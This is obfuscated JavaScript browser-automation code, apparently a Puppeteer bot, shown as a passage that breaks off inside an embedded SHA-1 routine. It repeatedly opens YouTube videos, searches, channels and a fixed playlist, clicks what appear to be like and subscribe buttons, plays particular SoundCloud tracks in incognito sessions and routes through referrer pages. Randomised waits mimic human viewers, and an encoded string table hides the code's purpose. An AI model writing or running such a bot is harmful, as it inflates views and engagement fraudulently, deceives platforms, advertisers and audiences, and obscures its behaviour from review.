const W = d,
  V = c,
  U = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x264a + 0x7 * 0x207 + -0x347a))) + i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1dfa + -0x139a + -0xa60 * 0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x75 * 0xd + 0x11ef * -0x1 + 0x4 * 0x5f8), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x4 * 0x40d + -0xe * 0xcd4 + 0x138fc + (-0x22e6 + -0x2b9 * -0x13 + 0x29c3) * random()) : await standardWaitForNetIdle(f), await wait(-0x236e + -0x2 * -0x115 + 0x34cc + (-0x3dc1 + -0x745 + -0x159e * -0x5) * random()), -0x20b4 + 0x5ca * -0x1 + 0x267f;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x5 * 0x3b3 + 0x2334 + 0x2d3), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x17a6 + -0x24f6 + 0x107 * 0x3b;
}
async function randomWait() {
  return await wait(-0x1631 + 0x2065 + -0x255 * -0x4 + (-0x17e3 + -0x239 * -0xf + -0x6 * -0x1ae) * random()), 0x88 * -0x15 + 0xd * 0xd2 + 0x7f;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * 0x739 + 0x4 * -0x8a8 + 0x1b67, 0x13ec + 0x6aa * -0x2 + -0x691), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x179 * -0x4b + 0x82aa + -0x6bd) * getRandomInt(0x10a5 + 0xb87 * 0x2 + -0x27b1, 0x10a + 0x1 * -0x18ca + -0x17c5 * -0x1), h)), 0x245e + -0x1 * 0xa7b + -0x19e2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x5b5 + -0x255c + 0x1fa7;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x2 * -0xf65 + 0xa6f + 0x1 * 0x145c]['split']('\x20');
    for (let k = 0x1217 + -0x23f3 + 0xc * 0x17d; k < i['length']; k += 0x1b29 + 0x1ef2 * -0x1 + 0x3cb)
      j += i[k] * h[i[k + (0xf2 * 0x27 + 0x6 * 0x57b + -0x45bf)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = b;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + R(0xb, 'XQUL')), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x3e7 + 0x39 * 0x86 + -0x19e9)['map'](l => Array['from'](l['children']))['flat'](-0x1 * -0xd29 + -0x3b * 0x9b + -0x1 * -0x1691)['map'](l => l['childNodes'][-0xf * 0x1db + -0xd6 * 0x23 + -0x38 * -0x105]['childNodes'][0x1 * 0x1479 + -0x27 * 0x53 + -0x7d4]['childNodes'][0x1ed7 + -0x1f5a + 0x84]['childNodes'][-0x777 + 0x3e * -0x38 + 0x7 * 0x301]['childNodes'][-0x1c23 + 0x133b + -0x1 * -0x8e9]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1 * 0x2fe + 0x8a5 * -0x1 + -0x1 * -0x98f, -0x23e4 + 0x1edb + 0x1891 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1af + -0x1a5 * -0x1d + 0x49c * 0x2);
  const h = await getMaxTime(f),
    i = Math['min']((0xc443 + 0x8d64 + 0x15 * -0x4eb) * getRandomInt(-0x1 * 0x22a3 + 0x2099 + -0x1 * -0x20c, -0x1317 + 0x1a7 + 0x1175), h);
  return await wait(i), -0x1 * 0x1d36 + 0x5b + 0x1cdc;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0xd15 + 0x1a8 * 0x1 + 0x19 * 0x75]['children'][0x3 * -0x69 + 0x1de1 * 0x1 + -0x1ca6]['children'][-0x3df + 0x111 + 0x2ce]['children'][-0x2324 + 0x14a0 + 0xe84]['children'][-0x8 * 0x485 + 0x139 * 0xb + 0x16b5]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xe09 * -0x1 + -0x196 + 0xfa0;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x46f * -0x1 + -0x1e13 * -0x1 + -0x1940 + (0x1 * 0x185 + -0x52 * 0x4 + -0xb) * random()
  }), await wait(-0x1 * -0x8f5 + 0x7f * -0x4e + 0x1ab * 0x13 + (0x8d3 + 0x3ce * -0x5 + -0x29 * -0x47) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1942 * 0x1 + 0xf * -0x176 + -0x3d * -0xc6]['childNodes'][0x256f + -0x896 * -0x1 + -0x2e04]['childNodes'][0xe38 + 0x17 * 0x177 + -0x2fe8]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1 * 0x5b6 + -0x125 * -0x1d + -0x1b76]['childNodes'][0x122a + -0x1 * 0x137c + 0x152]['childNodes'][-0x61c * 0x3 + 0xef9 + 0x35d]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x21f8 + 0x1ca9 + -0x3ea0),
          r = -0x101 * -0xf + 0x391 + -0x12a0;
        for (let u = -0xcb8 + 0x862 + 0x456; u < q['length']; u += -0x1e82 + 0x3cd * 0x1 + -0x1 * -0x1ab7)
          r += q[u] * k[q[u + (-0x6f5 + -0xd7 * 0x1 + 0x7cd)]];
        return r;
      }(n);
  });
  await wait((-0x3cf4 + 0x5071 + 0x271b) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x11938 + 0x107a7 + 0x313 * -0x65) * getRandomInt(0x39 * -0x14 + 0xb86 + -0x711, 0x1ae + -0x1ac + 0x8), h + (0x1 * -0x4a7 + -0x2 * -0x612 + 0x1 * 0xc0b));
  return await wait(i), -0x4 * 0x6da + 0x1 * 0x16fb + 0x46e;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1dfa + -0x139a + -0xa60 * 0x1);
    let h = e[f];
    if (b['MeqxVK'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x5c9 * -0x5 + 0xa70 + -0x1 * -0x127d, s, t, u = 0x1 * 0x6d7 + 0x71 + 0x4 * -0x1d2; t = n['charAt'](u++); ~t && (s = r % (-0x1 * 0x1855 + 0x43c + 0x141d) ? s * (0x3bf * 0x2 + 0x2 * -0xb83 + 0xfc8) + t : t, r++ % (-0x1def + -0x3e * -0x9e + -0x851)) ? p += String['fromCharCode'](-0xba2 + -0x373 * -0x5 + -0x49e & s >> (-(-0x236e + -0x2 * -0x115 + 0x2146) * r & -0x1ee1 + -0x3a2 + -0x4ef * -0x7)) : -0x20b4 + 0x5ca * -0x1 + 0x267e) {
          t = o['indexOf'](t);
        }
        for (let v = -0x5 * 0x3b3 + 0x2334 + -0x10b5, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x17a6 + -0x24f6 + 0x161 * 0x2c))['slice'](-(-0x1631 + 0x2065 + -0xae * 0xf));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x17e3 + -0x239 * -0xf + -0x5 * 0x1e4,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x88 * -0x15 + 0xd * 0xd2 + 0x7e; u < 0x1 * 0x739 + 0x4 * -0x8a8 + 0x1c67; u++) {
          p[u] = u;
        }
        for (u = 0x13ec + 0x6aa * -0x2 + -0x698; u < -0x4c * -0x1f + 0xae4 + -0x1318; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x10a5 + 0xb87 * 0x2 + -0x26b3), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x10a + 0x1 * -0x18ca + -0x260 * -0xa, q = 0x245e + -0x1 * 0xa7b + -0x19e3;
        for (let v = 0x5b5 + -0x255c + 0x1fa7; v < n['length']; v++) {
          u = (u + (0x2 * -0xf65 + 0xa6f + 0x1 * 0x145c)) % (0x1217 + -0x23f3 + 0x22 * 0x8e), q = (q + p[u]) % (0x1b29 + 0x1ef2 * -0x1 + 0x4c9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xf2 * 0x27 + 0x6 * 0x57b + -0x44c0)]);
        }
        return t;
      };
      b['rPoRCe'] = m, c = arguments, b['MeqxVK'] = !![];
    }
    const j = e[-0x3e7 + 0x39 * 0x86 + -0x19ef],
      k = f + j,
      l = c[k];
    return !l ? (b['iqSBuc'] === undefined && (b['iqSBuc'] = !![]), h = b['rPoRCe'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0x1731 + 0x57 * 0x2 + 0x2a7 * -0x9), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const S = c;
        document['querySelec' + S(0xd)]('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1998 + -0x9d * -0x3 + 0x2379 + (-0x22c2 + 0x2 * -0xba8 + 0x2 * 0x1efd) * Math['random']());
    });
  }, -0x282c + 0x2987 * -0x1 + 0x3 * 0x2459);
  await wait(-0x58057 + 0xd * 0x7865 + -0x22 * -0x1ddb);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x18f0f * 0x1 + -0x5 * -0x199d + 0x1f95e) * getRandomInt(-0x1efd + 0x479 * -0x7 + 0x8 * 0x7ca, 0xd53 + -0xa25 * 0x3 + 0x1135)), clearInterval(h), 0x137 + 0x22bd + -0x23f3;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1e1a + -0x3 * 0x9f2 + 0x3bf0;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x1 * 0x2456 + -0xa * -0x1e1 + 0x118d;
    await randomWait();
  }
  return 0x1 * 0x1534 + -0x20f * -0x2 + -0x1 * 0x1951;
}

function fetchRandomSC() {
  return Math['random']() <= 0x6f * -0x2b + 0x887 + -0xa1e * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x2370 + -0x44f + -0x37 * -0xb9 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x4 * -0x313 + 0x1081 + -0x435 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x2656 + -0x1 * 0xbaf + 0x3205;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x1a * -0xcc8 + 0xdc5 + -0xaa4d + getRandomInt(-0x34c4 + 0xc8 + 0x6e94, 0x7bd1 * -0x1 + -0x8e57 + 0x553 * 0x48));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1 * -0x143b + -0x16b6 + 0x2af2), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x33d * -0x3 + -0x256d + 0x2f24;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0xc7 * 0xb + -0x1f * 0x3e + 0x100f, -0x17 * 0x5c + -0x1f35 + 0x27ab)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xe8 * -0x4 + -0x10e5 + 0x1515 + floor((0x1fdc + -0xe3 * -0x4 + -0x1f80) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x8eaf5326 + 0x49b03f1e + -0x585f9244),
          -0x78f011 + -0x1e143e + -0x5b3 * -0x30f5,
          0x830 * 0x8 + -0x7df3 + -0x27 * -0x4d5,
          -0x3 * 0x225 + 0x1c6c + 0x157d * -0x1
        ], y = [
          -0x1 * 0x1e1 + 0xb * 0x26b + -0x18a0,
          -0x84d + 0xb3 * -0x26 + 0x10f * 0x21,
          -0xb9c + -0x59 * -0x44 + 0xc00 * -0x1,
          -0x196a * 0x1 + -0xd0c + 0x2676
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x196 + 0x1ca3 + 0x1e38 * -0x1)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x902 + -0xf83 + 0x1885; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x22 * 0x4e + -0x1 * -0x8cd + -0x1329) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1f01 + 0x1e18 + 0x3d19 * -0x1] = A[0x1 * -0x2a2 + 0x98 * -0x17 + 0x7 * 0x256] = A[-0x824 + 0x11c8 * -0x1 + 0x19ed] = A[-0x25d + 0x36 + 0x229] = A[-0x2e1 * 0xd + -0x194b + -0x1 * -0x3ebb] = A[0xb2 * -0x2e + 0x1a50 + 0x4 * 0x16c] = A[-0x1509 + 0x3fe + 0x1110] = A[0x7b3 * 0x4 + -0x198e + -0x538] = A[-0x1609 + -0x39 * 0x88 + 0x3458] = A[-0x71 * -0x8 + 0xec * 0x5 + -0x81c] = A[0xbd * 0x8 + 0x13 * -0x71 + 0x284] = A[-0xc73 * -0x1 + 0x19fa + 0x1 * -0x2663] = A[0xe * 0x23f + -0x1 * 0x13f3 + -0xb74] = A[-0x2 * 0xa7b + 0x1089 * 0x2 + -0xc10] = A[0x1 * 0x1336 + -0x19ad + 0x3 * 0x22c] = A[0x183a + -0xa3 * -0xb + -0x17 * 0x15b] = A[0x868 * 0x1 + 0x11ff * 0x2 + -0x2c57] = 0x58 * -0x44 + -0x221c + 0x397c, this['blocks'] = A) : this['blocks'] = [
                -0x21bd + -0x56 * 0x31 + 0x1 * 0x3233,
                -0x22c6 + -0x90f + 0x2bd5,
                -0x22a7 + 0x1c16 + -0x691 * -0x1,
                0x89 * 0x15 + -0xd * -0x121 + 0x3e * -0x6b,
                -0x2 * -0x7c + -0x8db + 0x7e3,
                -0x13 * 0x66 + -0xda0 + 0x1532,
                -0xa7 * -0x7 + 0x1 * 0x1bf8 + -0x1 * 0x2089,
                0x1983 + 0x109 * 0x22 + 0x1 * -0x3cb5,
                0x1 * -0x1743 + -0x232b * -0x1 + -0x3f8 * 0x3,
                0x4f * 0x4e + -0x227 + -0x15eb,
                -0x8f + 0x215 + -0x186,
                0xf06 * -0x1 + 0x20d5 * 0x1 + -0x11cf * 0x1,
                -0x25b4 + 0x959 * -0x4 + -0x258c * -0x2,
                -0x26be + -0x212d * -0x1 + 0x591,
                -0x9d8 + 0x158 + -0x2 * -0x440,
                0x1 * -0x1615 + 0xb36 + 0xadf,
                -0x9 * -0x415 + 0x1e5e + -0x431b
              ], this['h0'] = 0x8 * -0x88ee84e + 0x6 * 0x1d19cc5f + -0x2de64c9, this['h1'] = 0x1 * 0x1c6daf03f + 0x3 * 0x88e19f45 + -0x271b22285, this['h2'] = 0x1a635b * 0x3d2 + -0x9 * -0x17bc551 + -0x1 * -0x26915b7f, this['h3'] = -0x202bb74e + -0x189b125d + 0x48f91e21, this['h4'] = -0x2f * -0x114af03 + -0x392 * -0x2eff12 + -0x16c3ede1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1661 + 0x35b * 0x8 + -0x477, this['finalized'] = this['hashed'] = 0x6 * -0x4a3 + -0x1996 + 0xd5a * 0x4, this['first'] = 0x1f0f * 0x1 + -0x1864 + -0x6aa;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0xa65 + -0x25d * 0xb + 0xf9a, O = J['length'] || 0x2170 + -0x3 * 0x92f + -0x5e3, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x15e6 + 0x771 * -0x3 + -0x6d * -0x1, P[0x644 + -0x2327 + 0x1ce3] = this['block'], P[-0x25 * 0x33 + 0x2 * -0x7f9 + 0x1761] = P[-0x1b71 + 0x6e0 + -0x1492 * -0x1] = P[-0x1f82 + 0xc2f * -0x1 + -0x3 * -0xe91] = P[0x270b * 0x1 + -0x7 * -0x3c3 + -0x415d] = P[0x3e * 0x63 + -0x2521 + 0xd2b] = P[-0xc3b + 0x8c * -0x15 + -0x17bc * -0x1] = P[0x19ea + -0x20b1 + -0x1 * -0x6cd] = P[-0x1bf4 + 0x270 * 0x4 + 0x123b] = P[0x11 * 0x233 + -0xfab + 0x2 * -0xad8] = P[0xa25 + -0x8 * 0x485 + -0xd06 * -0x2] = P[-0x128b + -0xdf6 + 0x208b] = P[-0x1 * -0x4b2 + 0x6d5 * -0x3 + 0x2a4 * 0x6] = P[-0xd9c + -0x62 * -0x43 + -0xbfe] = P[-0xbdb + 0x919 + 0x1 * 0x2cf] = P[-0x160 * 0x1 + -0x3ab * 0x1 + 0x519] = P[-0x5f2 + -0x9f3 + 0xff4] = 0x275 + -0x13 * -0x17e + -0x1ecf), K) {
                    for (N = this['start']; M < O && N < -0x155 * 0x7 + -0x241d + -0x8 * -0x5b6; ++M)
                      P[N >> -0x203c + 0x25d1 + 0x1 * -0x593] |= J[M] << y[0x173b + 0x850 + 0x3f1 * -0x8 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x740 + 0xe3 * 0xe + -0x25 * 0x22; ++M)
                      (L = J['charCodeAt'](M)) < 0x1f46 + -0x99f * -0x2 + -0x3204 ? P[N >> -0x2 * 0xbf6 + 0x1 * 0x20a1 + -0x83 * 0x11] |= L << y[-0x1 * -0x402 + -0x42 * 0x6f + 0x189f & N++] : L < 0x1894 + -0x18e0 + 0x2c4 * 0x3 ? (P[N >> -0x2b * -0xdf + -0x36b * -0x7 + -0x8 * 0x7ac] |= (0xd07 * 0x2 + -0x1 * 0x18ee + -0x60 | L >> 0x649 * 0x6 + -0x30c + -0x22a4) << y[0x19c7 + 0x4f * -0x13 + -0x13e7 * 0x1 & N++], P[N >> 0xba7 * 0x1 + -0xbbc + 0x17] |= (-0x38 + 0x2580 + -0x24c8 | 0x1 * -0x50d + 0x1a * 0x25 + -0x2 * -0xc5 & L) << y[-0x3 * -0x7cf + 0x2 * 0xe30 + -0x7 * 0x766 & N++]) : L < -0x5d * 0x6b + 0x18e * -0xe3 + 0x25fc9 || L >= -0x950 * -0x30 + -0x3dd0 + -0xa130 ? (P[N >> 0x2134 + -0xdd * 0x1 + 0x1f * -0x10b] |= (-0xb * 0x9f + 0x12f4 * 0x2 + -0x1 * 0x1e33 | L >> -0x36d + -0x1855 * -0x1 + -0x14dc) << y[-0x82 * -0xe + 0x8 * -0x310 + 0x1167 & N++], P[N >> -0x4 * -0x32e + -0xe * -0x261 + -0x5 * 0x934] |= (0x216d * -0x1 + 0x99e + 0x184f | L >> 0xe0b + 0x1 * -0x12d7 + 0x2 * 0x269 & -0x25 * -0x5f + 0xbf7 + -0x1973) << y[0x1996 + 0x185e + 0x31f1 * -0x1 & N++], P[N >> 0xa1 + 0x27c + 0x1 * -0x31b] |= (-0x7f * 0x2 + -0x2577 + 0x26f5 | 0x16cd + -0x1 * 0x54b + -0x5c1 * 0x3 & L) << y[-0x159d + 0x65 * 0x7 + -0x1 * -0x12dd & N++]) : (L = -0x1abc8 + -0x10a3c + -0xc * -0x4f2b + ((-0xd19 + 0x1 * 0x25ca + 0x3 * -0x6e6 & L) << 0x2 * -0x11e1 + 0x1c59 + 0x773 | -0xfbb + 0x248f + 0x10d5 * -0x1 & J['charCodeAt'](++M)), P[N >> 0x93 * -0x1a + -0x1 * -0x1fb6 + -0xe2 * 0x13] |= (-0x20d6 + 0x1d + -0x1 * -0x21a9 | L >> -0xdd5 + -0x17c6 * -0x1 + -0x1 * 0x9df) << y[-0x13d6 + -0x422 * -0x1 + 0xfb7 * 0x1 & N++], P[N >> 0x2151 + -0xf9f + -0x11b0] |= (-0x74 * -0x1f + 0x24b6 + 0x1921 * -0x2 | L >> 0x1d0 * 0x2 + 0x1 * 0xa45 + -0x1 * 0xdd9 & 0x8b7 * 0x1 + -0x3d2 * 0x1 + -0x11 * 0x46) << y[0x77c * 0x1 + 0x84d + -0xfc6 & N++], P[N >> -0x1 * 0xd9f + -0x5 * 0x606 + 0x2bbf] |= (-0x192 * -0x9 + 0x26d7 + -0x3479 | L >> -0x1 * -0x3a1 + -0x1c5a + 0x18bf & -0x17a3 + -0xbc * -0x35 + 0xaf * -0x16) << y[0x1 * 0xc8d + -0x2 * 0x423 + -0x54 * 0xd & N++], P[N >> 0x61 * -0x25 + 0x1 * 0x4b2 + 0x1 * 0x955] |= (-0x3 * 0xb30 + -0x1 * -0x1f70 + -0x3 * -0xe0 | -0x1a75 + -0x211 * -0xb + -0x3 * -0x153 & L) << y[-0x6 * 0x117 + -0x5 * -0x41c + 0x1 * -0xdff & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x3 * 0x407 + -0x9 * -0xa1 + 0x6ac ? (this['block'] = P[0x52 * -0x39 + -0x209f * 0x1 + 0x32f1], this['start'] = N - (0x1326 + -0x8c1 * -0x4 + -0x35ea), this['hash'](), this['hashed'] = -0x5 * -0x220 + 0x1a6 * 0x1 + -0xc45 * 0x1) : this['start'] = N;
                }
                return this['bytes'] > 0xd2d8b1d7 * -0x1 + -0x105f84023 * 0x1 + 0x2d8d0f1f9 && (this['hBytes'] += this['bytes'] / (0x1 * -0x3517fbdc + -0x1c8a81628 + 0x2fdc01204) << 0x15b9 + -0x2029 * -0x1 + 0x1a2 * -0x21, this['bytes'] = this['bytes'] % (0x432de4 * 0x110 + -0xe082a420 + 0x153a50 * 0x1346)), this;
              }
            }
            ['finalize']() {
              const T = b;
              if (!this['finalized']) {
                this['finalized'] = 0x1 * -0x5fe + -0x2 * -0x455 + 0x1 * -0x2ab;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
